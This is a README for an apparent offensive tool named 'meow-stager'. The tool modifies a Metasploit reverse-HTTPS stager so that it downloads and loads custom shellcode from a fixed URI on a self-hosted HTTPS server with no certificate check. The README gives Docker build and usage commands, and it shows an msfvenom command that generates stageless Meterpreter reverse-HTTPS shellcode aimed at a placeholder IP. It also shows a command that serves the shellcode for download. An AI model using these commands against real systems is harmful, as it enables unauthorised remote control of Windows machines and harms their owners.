# HTTPS Shellcode Stager
This repository modifies the Metasploit (msf) stager to enable downloading and loading customized shellcode from the internet.

The original msf stager shellcode windows/x64/meterpreter/reverse_https generates a random URI using `generate_uri_uuid_mode()` and hosts a server to send the raw binary shellcode.

I have modified the URI to be fixed, allowing customization of its parameters. Users should host their customized shellcode on an HTTPS webserver, such as with `simple-https-server.py` or another server like nginx (no certificate check required).


## Build the container
```
sudo docker build -t meow-stager .
```

## Usage
```
Usage:  -a <arch> -i <ip> -p <port> -u <uri> -f <format>
```

Example:
```
# Generate stager shellcode
sudo docker run -i --rm meow-stager -a x64 -i 192.168.xx.xx -p 443 -u file/meow -f ps1


# Generate stageless shellcode and host on simple-https-server
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.xx.xx LPORT=10001 LURI=msf -f raw 
sudo python3 simple-https-server.py 443
```

